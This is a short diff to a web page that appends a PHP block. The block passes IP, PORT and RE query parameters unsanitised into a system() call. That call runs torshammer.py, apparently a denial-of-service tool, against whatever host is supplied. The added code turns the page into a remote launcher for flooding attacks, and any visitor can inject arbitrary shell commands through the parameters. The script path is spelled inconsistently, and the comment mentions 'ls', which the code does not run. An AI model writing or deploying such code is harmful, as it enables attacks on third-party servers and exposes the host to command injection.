@@ -4,6 +4,7 @@
     <meta charset="utf-8">
     <title></title>
     <link rel="stylesheet" href="style.css">
+    <link rel="alternate" href="Scripts.php">
   </head>
   <body>
     <menu></menu>
@@ -51,6 +52,15 @@
       </form>
     </div>
     <footer></footer>
+    <?php
+
+    // Use ls command to shell_exec
+    // function
+    $output = system('python2 scripts/ThorHammer/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE']);
+
+    print_r('python2 scripts/Torshammer/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE']);
+
+    ?>
   </body>
   <script type="text/javascript" src="main.js"></script>
 </html>
